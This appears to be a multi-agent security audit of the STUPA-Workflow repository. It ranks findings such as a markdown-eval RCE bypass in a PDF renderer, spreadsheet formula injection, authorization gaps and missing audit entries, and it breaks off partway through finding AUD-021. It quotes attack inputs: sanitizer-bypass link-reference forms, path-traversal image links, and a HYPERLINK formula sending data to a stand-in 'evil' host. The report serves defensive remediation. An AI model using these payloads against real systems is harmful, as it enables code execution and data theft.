# STUPA-Workflow — Comprehensive Repository Audit

**Date:** 2026-06-21 &nbsp;·&nbsp; **Branch:** feat/ui-kit-library &nbsp;·&nbsp; **Scope:** security + correctness + quality + dependencies, whole repo (backend, shared, frontend, MCP, pytex, deploy)

**Method:** 24 parallel area-auditors (every backend module + `app/shared/` + 4 cross-cutting sweeps + pytex + MCP + frontend security/quality), each finding then put through an *independent adversarial verifier* (instructed to refute, correct severity/location, default to 'uncertain'); refuted findings dropped; a lead auditor deduped & ranked the survivors. 110 agents total.

**Pipeline yield:** 85 raw findings → 3 refuted → 82 verified → **75 deduped findings**.

## Severity summary

| Severity | Count | | Category | Count |
|---|---|---|---|---|
| **Critical** | 1 | | Security | 29 |
| **High** | 0 | | Correctness | 25 |
| **Medium** | 16 | | Quality | 12 |
| **Low** | 45 | | Performance | 4 |
| **Info** | 13 | | Dependencies | 5 |

## Executive summary

## Overall Posture

The STUPA-Workflow codebase is, on the whole, a security-conscious and well-architected system: it has a hash-chained append-only audit log, a pure whitelist guard evaluator for the flow engine, an excellent runtime SSRF guard for webhooks, correct secret-ballot identity/choice splitting, fail-closed virus scanning, PKCE-enforced OAuth, and a centralized RBAC chokepoint. Most findings are low/info defense-in-depth or correctness issues, and the adversarial verification pass has already correctly downgraded a large number of over-stated impacts.

## Headline Risk — the pytex RCE is NOT fixed

The single most important finding is that **the previously-reported pytex markdown-eval RCE is still present and still reachable through the protocol-PDF path** (CRITICAL). The prior fix — a regex sanitizer (`sanitize_user_markdown` / `_EVAL_COMMENT_RE`) — is bypassable because it is line-anchored while the CommonMark link-reference-definition it tries to neutralize can span multiple lines (`[//]:\n#\n"EXPR"`) or be nested in a blockquote/list (`> [//]: # "EXPR"`). Both bypasses were reproduced end-to-end against the installed marko + pytex: the payload survives the sanitizer and reaches `eval()` with full `__builtins__` inside the pytex container, which renders user content at `trust_level=trusted`. The documented "second layer" (untrusted/sandboxed rendering) does not exist in code, and the library's own fallback strip uses the identical bypassable regex. An authenticated protokollant/committee minutes-editor can achieve container RCE. **Fix this first.**

## What to fix first

1. **pytex RCE (CRITICAL):** stop relying on a regex — parse with marko and drop all `LinkRefDef` nodes before assembly, AND render user content under a policy with `allow_markdown_eval` disabled. Add regression tests for the multi-line and container-nested payloads. The two supporting findings (trusted-by-default rendering as single point of failure; no OS sandbox / `no-new-privileges` on the pytex container) compound this — harden the container (`cap_drop`, `read_only`, seccomp) so any future bypass is contained.
2. **XLSX/CSV formula injection (MEDIUM):** the GDPR Auskunft, applications, and expenses exports write public-applicant strings into cells with no `=+-@` neutralization — a stored injection that detonates in privileged staff spreadsheets. One shared sanitizer fixes all sinks.
3. **GDPR completeness (MEDIUM x2):** Art.17 anonymization leaves applicant PII in comment bodies; Art.15 Auskunft omits comments/attachments. Both undermine the compliance workflows the module exists for.
4. **Authorization asymmetries (MEDIUM):** protocol write/finalize and standalone vote management gate on global permissions, locking out per-Gremium protokollants (fail-closed functional break) while reads were scope-hardened — risk-inverted and contradicts the sessions-protokollant redesign.
5. **Operational/availability (MEDIUM):** slow-drip webhook responses can pin the shared arq worker (starving mail/scan/PDF/cron); nginx trusts all of RFC1918 for X-Forwarded-For (rate-limit/audit-IP spoof from any internal container).
6. **Audit-trail gaps (MEDIUM):** application deletion, the `assignBudget` flow action, and vote create/open all mutate audited-domain state with no audit entry.

## Notable downgrades

Several initially-scary items were correctly refuted or downgraded by verification and should NOT drive remediation priority: the OAuth double-spend is bounded to a legitimate code-holder (MEDIUM), the ZUGFeRD XXE is blocked by libexpat's amplification guard on the runtime (INFO), the audit cross-tenant PII read is only reachable via admin misconfiguration (LOW), and the Angular HTTP-cache-poisoning advisory is unreachable (CSR-only SPA, no SSR hydration).

## Cross-cutting themes

- **Trust-boundary erosion in the pytex render pipeline** — The Markdown→PDF renderer is the highest-risk component and multiple findings converge on it: user content is rendered trust_level=trusted by default (single configurable barrier), the sole RCE guard is a bypassable line-anchored regex, the documented untrusted/sandboxed second layer does not exist in code, the library's own fallback strip shares the identical regex bug, the application-PDF path doesn't even apply the sanitizer (only newline-collapse incidentally blocks eval, but image path-traversal is undefended), and the container has no OS sandbox / no-new-privileges / cap_drop. Defense-in-depth is structurally absent on the one service designed to execute code.
- **Spreadsheet/CSV formula injection across all XLSX exports** — Every workbook builder in shared/xlsx.py (Auskunft, applications, expenses) interpolates user-controlled strings into cells with no =+-@ neutralization, openpyxl persists leading-= strings as live formulas. Public applicants can plant payloads that detonate in privileged staff spreadsheet apps. A single shared _safe() helper applied at the one append chokepoint fixes all sinks.
- **Missing audit entries on audited-domain mutations** — The system has a strong hash-chained audit log and a house rule that money/destructive mutations are audited, but several paths bypass it: application deletion (destroys vote results + budget entry), the assignBudget flow action (vs the audited canonical assign_budget), and vote create/open/eligibleCount override. These undermine forensic attribution and the append-only integrity guarantee.
- **Global vs per-Gremium permission resolution asymmetry** — GremiumRole permissions never enter Principal.permissions (only vote.cast feeds groups), so endpoints gated on global meeting.manage/vote.manage lock out per-Gremium protokollants and vote managers who can edit the underlying data via the livevote/WS path. Protocol write/finalize, protocol reads, and standalone vote management all exhibit this, repeatedly contradicting the sessions-protokollant redesign. Reads were scope-hardened while higher-impact writes were not, inverting the risk.
- **Check-then-act races under READ COMMITTED with no DB-level guard** — Multiple application-code invariants lack DB backing: OAuth code double-spend, refresh-token rotation fork, gremium-membership overlap (no EXCLUDE constraint), and mail-template/role create races. The codebase already has the correct atomic pattern (magic-link's UPDATE...WHERE used_at IS NULL) but doesn't apply it consistently; some surface as 500s instead of 409s.
- **Naive datetime accepted against timestamptz comparisons** — The tz-aware-datetimes house rule is violated in several spots — audit since/until, DeadlinePolicy.absolute_at — because no shared AwareDatetime base or coercion exists. On the asyncpg runtime these yield 500s; with a non-UTC DB session they shift windows. A shared AwareDatetime type would close all of them.
- **Unbounded per-tick / per-dispatch scans and in-memory buffers** — Several worker/query paths scale with total history rather than work-to-do: deadline/vote/auto-transition crons load full due-sets with no LIMIT, webhook _existing_keys loads all historical idempotency keys per dispatch, file downloads buffer whole objects in memory, and the never-cleared deadline-reminder index re-scans forever. All bounded today by data volume but lack ceilings.
- **Loose dependency hygiene and CI asymmetry** — Backend has a blocking pip-audit gate but frontend has no npm-audit step and no dependabot; no Python lockfile exists (bare >= floors for security-critical libs); pytex version pins diverge between pyproject/requirements/docstrings; and critical infra images (minio, clamav) float on :latest. Reproducibility and supply-chain clarity gaps rather than live exploits.
- **Misleading documentation/contracts vs actual code** — Several docstrings/READMEs assert protections that don't exist: protocol ReaderDep claims an assert_can_read it never calls, signed_url claims a signed/expiring URL it doesn't produce, the OAuth docstring claims a WHERE used_at IS NULL guard that's absent, and the MCP README advertises a forbidden cast_ballot tool. These rot silently and mislead future maintainers into unsafe assumptions.

---

## Findings

### 🔴 Critical

#### AUD-001 — Markdown sanitizer bypass → pytex eval RCE (multi-line and container-nested link-ref-def)

`critical` · `security` · area: **pytex / protocol-pdf**

**Location:** backend/app/modules/protocol/markdown.py:51-54 (_EVAL_COMMENT_RE); backend/app/modules/protocol/service.py:566 (trusted render, no override); pytex_markdown/convert.py (_eval_comment); pytex_api/_policy.py (TRUSTED⇒allow_markdown_eval); pytex_api/_security.py (fallback strip shares same regex)

**What:** The previously-reported pytex markdown-eval RCE is NOT fully fixed. Protocol PDFs render at trust_level=trusted (PytexClient default; service.py:566 passes no override), which enables allow_markdown_eval and runs un-sandboxed. The sole RCE guard is sanitize_user_markdown, whose _EVAL_COMMENT_RE is line-anchored (^[ \t]*\[...]) so it strips only single-line, leading-whitespace link-reference-definitions. Reproduced end-to-end against installed marko 2.2.3 + pytex_markdown: BOTH a multi-line form ([//]:\n#\n"EXPR") AND container-nested forms (> [//]: # "EXPR", - [//]: # "EXPR", 1. [//]: # "EXPR") survive the regex, parse into LinkRefDef(label='//',dest='#',title='EXPR'), and reach eval(expr, pytex_namespace()) with full __builtins__ — a side-effect file was written in PoC. The documented untrusted/sandboxed second layer does not exist in code, and pytex's own fallback strip (only active when allow_markdown_eval=False) uses the identical bypassable single-line regex. Merges findings [37] and [67].

**Impact:** An authenticated user who can write a TOP body or protocol.markdown (the meeting protokollant / minutes editor) achieves arbitrary code execution inside the pytex container on finalize: read/write of /cache and /app source, process spawn, and lateral movement to api/worker over the internal network. Egress isolation (pytex_net internal:true) limits exfiltration but not code execution or pivot.

**Fix:** Do not rely on a line-oriented regex against a CommonMark construct. Primary: in sanitize_user_markdown parse the body with marko and structurally remove every LinkRefDef node (and clear document.link_ref_defs) before assembly. Independently defang at the pytex layer: render protocol bodies under a policy with allow_markdown_eval disabled (sandboxed), or patch the converter to gate _eval_comment behind the trust policy. Add regression tests for [//]: # "X", > [//]: # "X", - / * / 1. variants, and the multi-line [//]:\n#\n"X" form, asserting no LinkRefDef/title survives and eval does not fire.

### 🟡 Medium

#### AUD-002 — Application deletion is irreversible, cascades to votes/budget entry, but writes no audit entry

`medium` · `security` · area: **applications**

**Location:** backend/app/modules/applications/router.py:399-407; service.py:501-505 (delete); audit/actions.py:12-72 (no APPLICATION_* action)

**What:** DELETE /api/applications/{id} (admin-only) does session.delete(app)+commit with no audit_record, and there is no AuditAction for application create/delete/patch. The delete cascades to applicant PII, all versions, status_events, magic-links, comments, the 1:1 budget_entry (CASCADE) and Vote rows (CASCADE). The single most destructive operation in the module leaves no trace, unlike audited MEETING_DELETE / BUDGET_NODE_DELETE.

**Impact:** A compromised or rogue admin can permanently destroy an application together with its vote history and budget linkage with zero forensic record; accidental deletions cannot be attributed. Accountability gap exploitable only by an authenticated admin (insider/compromised credential).

**Fix:** Add AuditAction.APPLICATION_DELETE and call audit_record() inside delete() in the same transaction, capturing actor + target_id + id-only metadata (no raw PII), mirroring MEETING_DELETE / BUDGET_NODE_DELETE.

#### AUD-003 — Authorization-code exchange is not atomic — concurrent requests can double-spend one code

`medium` · `security` · area: **auth**

**Location:** backend/app/modules/auth/oauth_service.py:118-145 (exchange_code); commit at oauth_router.py:227

**What:** exchange_code() reads the code row, checks used_at is None, then assigns used_at via a plain ORM write committed later by the router; no row lock and no atomic UPDATE...WHERE used_at IS NULL under READ COMMITTED. Two concurrent POST /api/oauth/token with the same code+verifier both observe used_at IS NULL and both mint token families. The docstring falsely claims a WHERE used_at IS NULL guard; the magic-link path implements exactly the missing atomic primitive.

**Impact:** Violates the RFC 6749/7636 single-use invariant: a malicious or buggy OAuth client holding its own code+verifier can fire two simultaneous token requests and obtain a second valid token family the legitimate client never sees and cannot revoke. PKCE enforcement means an intercepted-code attacker (without the verifier) cannot exploit it, so impact is bounded to the legitimate code-holder, hence medium.

**Fix:** Replace read-check-assign with an atomic conditional UPDATE mirroring the magic-link path: UPDATE...WHERE id=? AND used_at IS NULL RETURNING id, raising invalid_grant when no row is claimed; only then issue tokens. Alternatively SELECT...FOR UPDATE. Correct the misleading docstring.

#### AUD-004 — nginx set_real_ip_from trusts entire RFC1918 space, undermining edge X-Forwarded-For trust

`medium` · `security` · area: **deploy / secrets**

**Location:** deploy/web/nginx.conf:16-20

**What:** The edge nginx trusts 10/8, 172.16/12, 192.168/16 with real_ip_header X-Forwarded-For and real_ip_recursive on, so it accepts/rewrites the client IP from XFF for ANY peer in the entire private address space. nginx joins the internal+proxy docker networks, so every sibling container sits in a trusted 172.x range. The app's own .env.example explicitly forbids trusting whole RFC1918 ranges for exactly this reason, but the edge ships wide by default.

**Impact:** A compromised/malicious container on the internal/proxy network (popped api/worker, or any operator-added sidecar) can reach nginx:80 and spoof X-Forwarded-For, poisoning the audit-log client IP and the per-IP rate-limit keys (lock out a victim IP or bypass own limits). Defense-in-depth / lateral-movement amplification, gated by an internal foothold (no internet path), hence medium.

**Fix:** Replace the three broad set_real_ip_from lines with the single concrete CIDR/IP of the external NPM upstream (mirroring FORWARDED_ALLOW_IPS). nginx.conf is bind-mounted, so this is a prod-only edit. Ship a tight or deliberately non-matching placeholder so real_ip no-ops rather than trusting all of RFC1918.

#### AUD-005 — assignBudget flow action mutates budget association with no audit entry

`medium` · `security` · area: **flow**

**Location:** backend/app/modules/flow/extras_dispatcher.py:104-137 (_assign_budget)

**What:** The flow assignBudget handler sets app.budget_id and app.fiscal_year_id and commits with no audit record, unlike the canonical BudgetTreeService.assign_budget which writes AuditAction.BUDGET_ASSIGN on every change. It also bypasses _resolve_fiscal_year validation (picks the single active FY, leaves a stale FY if ambiguous). (Note: BUDGET_ASSIGN is not in REVERTABLE_BUDGET_ACTIONS, so the impact is the append-only trail/forensics, not the revert feature; the gremium-mismatch concern is a pre-existing shared gap, not flow-specific.)

**Impact:** Violates the house rule that money mutations are audited: a budget/cost-centre (re)association via a flow transition leaves no audit-log evidence, undermining the append-only money-mutation trail. Requires flow-configuration privilege to set up; forensic/compliance evasion, not escalation.

**Fix:** Delegate to BudgetTreeService.assign_budget (which writes the audit row and runs _resolve_fiscal_year) or write AuditAction.BUDGET_ASSIGN inside _assign_budget's transaction before commit. Thread a system/flow actor into the dispatcher for the audit row.

#### AUD-006 — Application-PDF path: public-applicant field values reach a trusted renderer with only newline-collapsing escape (image path-traversal undefended)

`medium` · `security` · area: **pdf**

**Location:** backend/app/modules/pdf/render.py:94 (trusted render); backend/app/modules/pdf/markdown.py:114-116 (_md_escape), :152-157 (field loop)

**What:** Application PDFs render trusted and embed public-applicant field values via build_application_markdown after only _md_escape, which merely collapses \r\n/\n/\r to spaces; sanitize_user_markdown is NOT applied here. The eval-comment vector is incidentally blocked (line-start anchored + newline collapse), but the inline image construct ![alt](/abs/path) or ![alt](../../x.png) survives verbatim and _UNSAFE_IMAGE_RE (applied on the protocol path) is never applied here.

**Impact:** The most-untrusted input path (public applicants) renders trusted with no explicit RCE/path-traversal sanitizer. Image path-traversal can exfiltrate a readable image file from outside the render dir into the PDF (ceiling limited to image-extension files per pytex's \includegraphics restriction). A change to _md_escape, the field layout, or pytex's parser could turn this into injection.

**Fix:** Run assembled application body / each applicant value through sanitize_user_markdown so _UNSAFE_IMAGE_RE neutralizes absolute/../ image paths and eval escapes are stripped; do not rely on newline collapse as the eval control. Prefer rendering this path sandboxed/untrusted. Add regression tests for [//]: # "x", ![a](/etc/x.png), ![a](../../x.png).

#### AUD-007 — Application anonymization leaves applicant PII in comment bodies (Art.17 incomplete erasure)

`medium` · `security` · area: **privacy / applications**

**Location:** backend/app/modules/applications/service.py:915-981 (anonymize); models.py:182-209 (Comment)

**What:** ApplicationsService.anonymize scrubs Applicant.email/name, isPII data across versions+diffs, magic-links and attachments, but never touches the Comment table. Applicants can post public comments (author_kind='applicant') with free-text bodies that may contain personal data; these rows survive both Art.17 paths (manual erasure queue and retention cron). Note: the comment author column is None for applicant comments, so the residue is the free-text body, not author.

**Impact:** After a GDPR erasure/retention sweep the application is reported anonymized yet an applicant's personal details typed into comment bodies remain in cleartext, readable via the comments API/timeline (by authenticated staff, since applicant magic-links are deleted). Defeats the Art.17 guarantee for content the applicant volunteered.

**Fix:** In anonymize() (within the same transaction) scrub applicant-authored comment content: UPDATE Comment SET body='[anonymisiert]' WHERE application_id=? AND author_kind='applicant'. Optionally redact principal comments quoting applicant PII. Add a test asserting list_comments() returns no applicant body text after anonymize().

#### AUD-008 — XLSX/CSV formula injection: user-submitted strings written to spreadsheet cells without escaping

`medium` · `security` · area: **privacy / shared**

**Location:** backend/app/shared/xlsx.py — build_auskunft_workbook (applicantName/typeName ~273-282), build_applications_workbook (item.title ~184), build_expenses_workbook (e.description ~221-232)

**What:** Every workbook builder writes attacker-controllable strings straight into cells via ws.append() with no =+-@ neutralization; openpyxl persists a leading-= string as a live formula. The most exposed sink is the GDPR Auskunft export, whose applicantName/typeName/data originate from public, unauthenticated applicants (POST /api/applications). A value like =HYPERLINK("http://evil/?"&A1,"click") or =WEBSERVICE(...) is stored as a live formula. Merges findings [42] and [49].

**Impact:** Stored client-side injection targeting the privileged staff who run exports (Art.15 Auskunft, application export, expenses export). On open, Excel/LibreOffice evaluates it: data exfiltration via =HYPERLINK/=WEBSERVICE, or legacy DDE command execution after the user clicks through security prompts. Reaches the highest-privilege staff via the very compliance workflow handling the most sensitive PII. Gated by the victim opening the file and overriding default security prompts, hence medium.

**Fix:** Add one _safe() helper in xlsx.py (prefix with apostrophe any string whose first char is = + - @ or tab/CR) and route every string cell — including json.dumps results — through a single shared append helper used by all builders so future columns can't forget it. Add a test feeding {"mySelect":"=1+2"} / applicant name "=HYPERLINK(...)" and asserting the cell is text.

#### AUD-009 — pytex container has no OS sandbox or no-new-privileges; trusted builds run un-contained

`medium` · `security` · area: **pytex / deploy**

**Location:** pytex/Dockerfile (no podman; USER uid 10001); deploy/docker-compose.yml:193-216 (no security_opt/cap_drop/read_only); pytex_api/_compile.py:239-260

**What:** pytex_api sandboxes only non-trusted builds via rootless Podman and fails closed if Podman is missing; the python:3.13-slim image ships no podman, so the service is effectively trusted-only and trusted builds run un-containerised in-process (allow_python_exec/allow_markdown_eval/allow_shell_escape, require_sandbox=False, apply_rlimits=False). Unlike the altcha and backup services, the pytex compose block sets no security_opt: no-new-privileges, no cap_drop, no read-only rootfs — on the one service designed to execute LaTeX/Python.

**Impact:** When the eval RCE fires (see the critical finding), there is zero OS-level confinement beyond uid 10001 and the egress block: read/write /cache and /app, process spawn, and reach to api/worker on the shared net. Amplifies any code-execution bypass rather than being independently exploitable.

**Fix:** Harden the pytex compose service to match/exceed the lesser services: security_opt:[no-new-privileges:true], cap_drop:[ALL], read_only:true with a tmpfs workdir and a writable /cache mount, plus a restrictive seccomp profile. Separately, bake podman+sandbox image into pytex so untrusted/sandboxed renders actually run, or pass trust_level=untrusted/sandboxed for user content and reserve trusted for fully template-controlled output.

#### AUD-010 — User-authored content rendered TRUSTED contradicts documented untrusted-downgrade design (single point of failure)

`medium` · `security` · area: **pytex / pdf**

**Location:** backend/app/modules/pdf/pytex_client.py:53 (default trusted); backend/app/modules/protocol/service.py:566; backend/app/modules/pdf/render.py:94

**What:** The docstrings/skill docs claim user-authored Markdown is rendered untrusted to block pytex's eval escape, but both live callers render at the trusted default. The protocol path's inline comment openly justifies this by leaning on sanitize_user_markdown as the sole eval barrier. For the markdown input kind these callers use, the only TRUSTED-gated RCE surface is the eval comment (allow_python_exec needs .py input; shell-escape is inert under tectonic), so the practical risk is the absence of policy-level defense-in-depth rather than a self-contained second exploit. Related to the critical sanitizer-bypass finding.

**Impact:** There is no second line of defence behind the regex sanitizer; any sanitizer bypass (already demonstrated) becomes direct RCE rather than a contained TrustError. Contradicts the documented design and concentrates risk on one configurable barrier.

**Fix:** Realize the documented defense-in-depth: compose user-authored body under a non-trusted (sandboxed) policy and only the app-generated scaffold as trusted — extend the SANDBOXED package allowlist to cover the protocol variants. Apply sanitize_user_markdown on the application path too. Reserve trust_level=trusted for 100% template-only documents.

#### AUD-011 — Slow-drip webhook response can pin a shared arq worker slot far past the timeout (DoS)

`medium` · `security` · area: **webhooks**

**Location:** backend/app/modules/webhooks/service.py:260-279 (_send_capped); backend/worker/webhook.py:70-74; backend/worker/main.py:86-114 (no job_timeout)

**What:** deliver() streams the response up to 64 KiB; the only time bound is httpx's scalar timeout, which is a PER-read timeout that resets on every successful chunk. A hostile/compromised receiver can drip one byte per <timeout interval and keep the read alive indefinitely up to the cap. There is no aggregate deadline (no asyncio.timeout, no job_timeout override). deliver_webhook shares the single arq worker with send_mail, scan_attachment, render_pdf, render_protocol, process_deadlines and retention.

**Impact:** A few registered webhook endpoints that go slow/hostile (an insider with webhook.manage, or a later-compromised target) can saturate the shared worker, stalling email delivery, virus scanning (uploads stay quarantined), PDF/protocol rendering, and the deadline/retention crons — DoS against core platform functions. Bounded by arq's default 300s job_timeout per slot and the webhook.manage precondition, hence medium.

**Fix:** Wrap the send+stream-read in asyncio.timeout(settings.webhook_timeout_seconds) for a hard total deadline; set an explicit (shorter) job_timeout on deliver_webhook; and isolate webhook delivery onto its own arq queue/worker so a hostile receiver cannot starve mail/scan/PDF/cron. Optionally pass a structured httpx.Timeout.

#### AUD-012 — Switching agenda TOPs within autosave debounce silently drops minutes edits

`medium` · `correctness` · area: **fe-quality**

**Location:** frontend/src/app/features/meetings/meetings.component.ts:1038 (onTopBodyChange shared bodyTimer), :1033 (selectTop, no flush)

**What:** The minutes editor uses a single shared 1000ms bodyTimer for the debounced autosave of all TOP bodies. selectTop only sets selectedTopId and does not flush the pending timer; editing the next TOP calls clearTimeout(bodyTimer), discarding the previous TOP's still-pending save. There is no optimistic local retention and no unsaved-changes indicator.

**Impact:** Unsaved edits to legally/audit-relevant meeting minutes are silently lost when a protokollant edits one TOP and quickly switches to and edits another. Gated on write permission and a sub-second switch-and-type race, hence medium.

**Fix:** In selectTop flush the pending debounce before switching (capture pending itemId+body into instance fields and fire setAgendaBody synchronously), or key the pending save per-TOP id, and optimistically update the local agenda() body. A blur-flush on the markdown editor would also help.

#### AUD-013 — Flow-graph validator does not reject cycles of automatic transitions (infinite auto-advance / mail flood)

`medium` · `correctness` · area: **flow**

**Location:** backend/app/shared/config_schemas.py:256-365 (validate_flow_graph); backend/worker/deadlines.py:261-295 (_process_auto_transitions); main.py:105 (minutely cron)

**What:** validate_flow_graph rejects single-state self-loops and runs reachability but performs no acyclicity check over the automatic-transition subgraph. A guard-less automatic transition evaluates True, so two normal states A,B each with an automatic transition to the other pass validation. The minutely cron then fires one hop per application per cycle indefinitely; each hop writes a StatusEvent + status_change audit row and dispatches applicant/task mails. The optimistic lock prevents double-fire within a cycle but not the perpetual ping-pong.

**Impact:** An admin (flow-edit) misconfiguration produces unbounded StatusEvent + audit-log growth and a continuous flood of applicant/task emails per affected application — a mailbomb and audit-table bloat with no automatic stop. Privileged-misconfiguration vector, self-announcing, hence medium.

**Fix:** In validate_flow_graph add cycle detection restricted to the automatic-transition subgraph (DFS/Tarjan over edges where t.automatic) and raise FlowValidationError on any back-edge. Defense-in-depth: cap auto-advance hops per application per process_deadlines pass.

#### AUD-014 — Unhashable select/multiselect answer crashes validation with uncaught TypeError (500 on public submit)

`medium` · `correctness` · area: **forms**

**Location:** backend/app/modules/forms/validation.py:385 (_validate_select), :396 (_validate_multiselect)

**What:** _validate_select/_validate_multiselect test applicant-controlled values against a set[str] with no isinstance guard; a non-hashable value ({"a":1} or [1]) raises TypeError on the set-membership test. validate_answers' callers catch only AnswerValidationError, so the TypeError escapes the pure engine, violating its collect-all-errors contract. (A global Exception handler returns a sanitized 500 problem+json, so there is no crash/info-leak; body-cap limits payload size.)

**Impact:** An unauthenticated attacker hitting public POST /api/applications of any type with a select/multiselect field forces a 500 instead of the contracted 422 with a tiny body. Error-contract violation; not a meaningful DoS given the body cap and clean handler. Merges the type-confusion finding [14] (same root cause).

**Fix:** Guard the value type before membership: in _validate_select require isinstance(value,str); in _validate_multiselect flag non-string elements. Optionally wrap _validate_value dispatch in try/except→FieldError as defense-in-depth. Add tests for {"mySelect":{"a":1}} and {"myMulti":[{"a":1}]} expecting AnswerValidationError.

#### AUD-015 — Auskunft (Art.15) export omits comments and attachment records — incomplete data-subject access

`medium` · `correctness` · area: **privacy**

**Location:** backend/app/modules/privacy/service.py:245-348 (AuskunftService.collect)

**What:** collect() assembles only applicant rows, applications (+data), submission-version history, and the matching principal row. It omits the subject's comments (applicant-authored bodies are clearly their personal data), attachment metadata (filenames can be PII), and status-event notes — all tied to the same email/application. The controller's own anonymize() treats attachments/comments as PII under Art.17 while the access export ignores them (self-inconsistent).

**Impact:** The generated Auskunft XLSX is materially incomplete, a GDPR Art.15 completeness defect. Strongest indisputable additions are applicant-authored comments and attachment filenames.

**Fix:** Extend collect() for the resolved app_ids to gather Comment rows (at minimum author_kind='applicant' / public), Attachment metadata (filename/content_type/created_at, not the object), and optionally StatusEvent notes, with corresponding sheets in build_auskunft_workbook.

#### AUD-016 — Protocol write/finalize and read endpoints gated on GLOBAL meeting.manage, locking out per-Gremium protokollants

`medium` · `correctness` · area: **protocol-pdf / xcut-authz**

**Location:** backend/app/modules/protocol/router.py:42-44,76-84,119-186,189-231; vs livevote/service.py:440-449 (can_write); auth/rbac.py:99-114 (gremium perms never enter principal.permissions)

**What:** All protocol write endpoints (PATCH /protocols/{id}, POST /votes, POST /finalize) and read/PDF endpoints gate on global meeting.manage / protocol.finalize / meeting.view_all. resolve_principal never adds per-Gremium GremiumRole.permissions (session.manage/protocol.write) to principal.permissions, while the livevote stack authorizes the same workflow per-Gremium via MeetingService.can_write (assigned protokollant + per-Gremium roles). The agenda-item bodies that constitute the minutes are editable per-Gremium, but the protocol that assembles them is not. Merges findings [38] and [53]; the router docstring even cites an explicit but contradictory #28/#6 decision while the sessions-protokollant redesign implements the per-Gremium model on the livevote side.

**Impact:** A designated protokollant or per-Gremium protocol.write/session.manage holder lacking global meeting.manage can edit the TOP bodies but is 403'd on PATCH/embed-votes/finalize/read of that meeting's protocol. The per-meeting protokollant feature is broken for the editor REST path; only org-wide meeting.manage holders can finalize. Fail-closed (no over-exposure), hence correctness not security.

**Fix:** Resolve the protocol's meeting and delegate to MeetingService: enforce can_write for PATCH/POST votes/finalize (with finalize additionally gremium-scoped via protocol.finalize), and assert_can_read for the read/PDF endpoints, mirroring livevote/router.py. Add a regression test: a protokollant with only a gremium protocol.write role can PATCH and read their own meeting's protocol but is 403 on another gremium's.

#### AUD-017 — Frontend ships high/moderate npm advisories with no CI audit gate

`medium` · `deps` · area: **xcut-deps**

**Location:** frontend/package.json (Angular 20.3.24); .github/workflows/ci.yml (fe-unit has no npm-audit step); .github/dependabot.yml absent

**What:** npm audit on the committed lockfile reports 38 vulnerabilities (14 high, 22 moderate, 2 low). Reachable runtime issues: @angular/compiler two-way-binding sanitization-bypass XSS (moderate) and formatDate ReDoS (high, self-inflicted client DoS). The headline HttpTransferCache cache-key/hydration DOM-clobbering 'highs' are UNREACHABLE here — this is a CSR-only SPA with no SSR client hydration. Build-chain highs (undici/vite/piscina/esbuild) are dev/build-host only. Backend has a blocking pip-audit gate; frontend has no npm-audit step and no dependabot.

**Impact:** The reachable runtime risk is a moderate compiler XSS in an app that renders user-submitted application/comment content, plus a low-impact client DoS; all Angular runtime highs are one-command patch-fixable (>=20.3.25). The CI asymmetry (backend gated, frontend ungated) means new JS CVEs land silently.

**Fix:** Run npm audit fix (bump Angular runtime to >=20.3.25, patch undici). Add a frontend CI gate (npm audit --audit-level=high with an allowlist for no-fix build-chain advisories) mirroring be-deps-audit, and add .github/dependabot.yml for npm+pip. The compiler XSS bump is the highest-value runtime fix.

### 🔵 Low

#### AUD-018 — audit-log revert bypasses the per-entity config/budget permissions the restore endpoint enforces

`low` · `security` · area: **audit-config**

**Location:** backend/app/modules/audit/router.py:129-150; config_revision/revert.py:47-154; vs config_revision/router.py:48-68,144 (_require_restore_perm)

**What:** The sidebar restore endpoint requires the matching per-entity permission (form/flow/site config). The audit-log revert endpoint performs an equal-or-stronger state change (config restore, budget money reversal, status reversal) gated ONLY by the single global audit.revert permission; _revert_config/_revert_budget/_revert_status re-check no per-entity perm and no per-Gremium scope. Mitigated today because migration 0034 grants audit.revert only to admin (who bypasses all checks).

**Impact:** If audit.revert is ever delegated to a non-admin role (a normal assignable permission), that role gains config-edit and money-mutation power over all committees, bypassing the granular RBAC the system relies on. Latent privilege-escalation / tenant-boundary gap, contingent on future delegation.

**Fix:** In RevertService.revert re-assert the original mutation's authority in addition to audit.revert (form/flow/site→restore perms, STATUS_CHANGE→application.transition, budget→budget.book/structure) and validate the target's Gremium scope. Keep audit.revert as an additional, not sole, gate.

#### AUD-019 — audit.read exposes cross-Gremium PII (names, emails, titles) with no tenant scoping

`low` · `security` · area: **audit-config**

**Location:** backend/app/modules/audit/service.py:260-297 (query_cursor) + resolvers 299-531; router.py:43-95

**What:** The audit list resolves actor sub, targets, and embedded UUIDs to clear names/emails/titles via global id IN(...) queries with no per-Gremium filter, gated only by the freely-assignable audit.read catalog permission. The skill doc's 'reachable via admin views anyway' justification holds only for full admins; a role granted just audit.read would read the entire platform's audit log with resolved PII. Note: this is a single-org product (Gremien are committees, not tenants); audit logs are inherently global; and the seed grants audit.read only to admin, so no attacker-reachable path exists today.

**Impact:** A non-admin principal holding only audit.read would obtain platform-wide PII (member emails, all application titles, all vote questions). Conditional on an admin deliberately creating such a scoped-auditor role expecting a scoping that does not exist — a least-privilege/documentation hazard, not a live isolation bypass.

**Fix:** Promote the 'audit.read = global read of ALL audit data incl. PII — do not grant for scoped auditing' note into the permission catalogue so admins configuring custom roles see it. If true scoped auditing is ever needed, scope query_cursor + resolvers to the caller's GremiumMembership set.

#### AUD-020 — Refresh-token rotation is non-atomic and lacks reuse detection — concurrent reuse can fork the token family

`low` · `security` · area: **auth**

**Location:** backend/app/modules/auth/oauth_service.py:148-189 (refresh_tokens); commit at oauth_router.py:227

**What:** refresh_tokens() looks up by hash, checks revoked_at is None, then assigns it and issues a new pair (router commits) — no row lock / conditional update under READ COMMITTED, so two concurrent refreshes both observe revoked_at IS NULL and both mint pairs. There is also no refresh-reuse detection: replaying an already-rotated token returns invalid_grant for that one row without cascade-revoking the forked family.

**Impact:** A leaked/replayed refresh token raced against the legitimate client yields two live, independently-rotating families for one grant, defeating rotation's theft-detection intent. Requires possession of a valid refresh token, hence low.

**Fix:** Make rotation atomic (UPDATE...WHERE id=? AND revoked_at IS NULL RETURNING id, treat 0 rows as invalid_grant) and add reuse detection: on an already-revoked token, cascade-revoke all non-revoked tokens for that principal+client to force re-auth.

#### AUD-021 — application/zip accepted for OOXML extensions lets any zip masquerade as a document

`low` · `security` · area: **files**

**Location:** backend/app/modules/files/mime.py:27,42-63 (_OOXML_ZIP/_EXT_TO_MIME); validate_upload 110-130

